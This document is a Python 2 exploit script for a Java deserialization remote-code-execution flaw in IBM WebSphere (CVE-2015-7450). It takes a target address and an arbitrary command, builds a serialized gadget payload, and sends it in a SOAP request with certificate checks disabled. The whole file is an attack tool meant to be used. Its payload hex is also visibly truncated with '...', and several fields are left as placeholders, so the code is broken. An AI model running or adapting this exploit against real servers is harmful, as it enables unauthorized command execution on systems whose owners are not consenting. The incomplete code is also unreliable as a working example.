#! /usr/bin/env python2

# IBM WebSphere Java Object Deserialization RCE (CVE-2015-7450)
# Modified to remove requests dependency for offline use
# Original by @byt3bl33d3r, adapted for offline environments

import urllib2
import ssl
import argparse
import sys
import base64
from binascii import unhexlify

parser = argparse.ArgumentParser()
parser.add_argument('target', type=str, help='Target IP:PORT')
parser.add_argument('command', type=str, help='Command to run on target')
parser.add_argument('--proto', choices={'http', 'https'}, default='https', help='Send exploit over http or https (default: https)')

if len(sys.argv) < 2:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if len(args.target.split(':')) != 2:
    print('[-] Target must be in format IP:PORT')
    sys.exit(1)

if not args.command:
    print('[-] You must specify a command to run')
    sys.exit(1)

elif args.command:
    if len(args.command) > 254:
        print('[-] Command must be less than 255 bytes')
        sys.exit(1)

ip, port = args.target.split(':')

print('[*] Target IP: {}'.format(ip))
print('[*] Target PORT: {}'.format(port))

# Serialized object building
serObj = unhexlify("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E48616E646C655255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6178...")
serObj += chr(len(args.command)) + args.command
serObj += unhexlify("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A")

serObjB64 = base64.b64encode(serObj)

# Dummy placeholders (you must replace with real values if you have them)
ser1 = "PLACEHOLDER_SER1"
ser2 = "PLACEHOLDER_SER2"
ser4 = "PLACEHOLDER_SER4"

xmlObj = "<?xml version='1.0' encoding='UTF-8'?>\r\n"
xmlObj += '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">\r\n'
xmlObj += '<SOAP-ENV:Header ns0:JMXConnectorContext="{ser1}" xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.7" ns0:JMXMessageVersion="1.2.0" ns0:JMXVersion="1.2.0">\r\n'.format(ser1=ser1)
xmlObj += '</SOAP-ENV:Header>\r\n'
xmlObj += '<SOAP-ENV:Body>\r\n'
xmlObj += '<ns1:invoke xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n'
xmlObj += '<objectname xsi:type="ns1:javax.management.ObjectName">{ser2}</objectname>\r\n'.format(ser2=ser2)
xmlObj += '<operationname xsi:type="xsd:string">getUnsavedChanges</operationname>\r\n'
xmlObj += '<params xsi:type="ns1:[Ljava.lang.Object;">{serObjB64}</params>\r\n'.format(serObjB64=serObjB64)
xmlObj += '<signature xsi:type="ns1:[Ljava.lang.String;">{ser4}</signature>\r\n'.format(ser4=ser4)
xmlObj += '</ns1:invoke>\r\n'
xmlObj += '</SOAP-ENV:Body>\r\n'
xmlObj += '</SOAP-ENV:Envelope>'

headers = {
    'Content-Type': 'text/xml; charset=utf-8',
    'SOAPAction': 'urn:AdminService'
}

url = '{}://{}:{}'.format(args.proto, ip, port)

print('[*] Sending request to {}'.format(url))

# Setup HTTPS handler that ignores certificate validation
if args.proto == 'https':
    ctx = ssl._create_unverified_context()
    req = urllib2.Request(url, data=xmlObj)
    for k, v in headers.items():
        req.add_header(k, v)
    response = urllib2.urlopen(req, context=ctx)
else:
    req = urllib2.Request(url, data=xmlObj)
    for k, v in headers.items():
        req.add_header(k, v)
    response = urllib2.urlopen(req)

print('[*] Exploit sent successfully, response code: {}'.format(response.getcode()))
